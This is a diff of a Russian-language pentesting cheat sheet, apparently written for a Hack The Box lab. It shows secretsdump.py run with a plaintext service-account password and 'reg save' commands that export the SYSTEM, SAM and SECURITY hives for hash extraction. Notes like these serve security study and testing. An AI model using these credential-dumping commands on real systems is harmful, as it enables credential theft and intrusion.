@@ -493,13 +493,13 @@ secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administr
 
 secretsdump.py egotistical-bank/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
 
------ Получить 10 последних пользователей
+# Получить SAM и 10 последних пользователей 
 
-Нужен system и security
+Нужен system, sam и security
 
-reg save hklm\system c:\system 
-
-reg save hklm\security c:\security
+    reg save HKLM\SYSTEM system.save
+    reg save HKLM\SAM sam.save
+    reg save HKLM\SECURITY security.save
 
 Подробнее: https://www.securitylab.ru/analytics/517178.php
 
